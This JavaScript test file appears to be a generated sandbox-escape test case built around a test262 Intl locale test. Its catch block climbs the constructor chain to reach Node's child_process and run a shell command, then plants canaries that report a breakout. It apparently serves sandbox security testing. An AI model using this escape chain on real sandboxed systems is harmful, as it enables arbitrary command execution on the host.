try {
    testWithIntlConstructors(function (Constructor) {
        throw () => {
            return () => {
            };
        };
        var info = getLocaleSupportInfo(Constructor);
        [
            'lookup',
            'best fit'
        ].forEach(function (matcher) {
            var supportedByConstructor = info.supported.concat(info.byFallback);
            var supported = Constructor.supportedLocalesOf(supportedByConstructor, { localeMatcher: matcher });
            var i = 0;
            var limit = Math.min(supportedByConstructor.length, supported.length);
            while (i < limit && supportedByConstructor[i] === supported[i]) {
                i++;
            }
            assert.sameValue(i < supportedByConstructor.length, false, 'Locale ' + supportedByConstructor[i] + ' is returned by resolvedOptions but not by supportedLocalesOf.');
            assert.sameValue(i < supported.length, false, 'Locale ' + supported[i] + ' is returned by supportedLocalesOf but not by resolvedOptions.');
        });
        var unsupportedByConstructor = info.unsupported;
        var supported = Constructor.supportedLocalesOf(unsupportedByConstructor, { localeMatcher: 'lookup' });
        assert.sameValue(supported.length > 0, false, 'Locale ' + supported[0] + ' is returned by supportedLocalesOf but not by resolvedOptions.');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}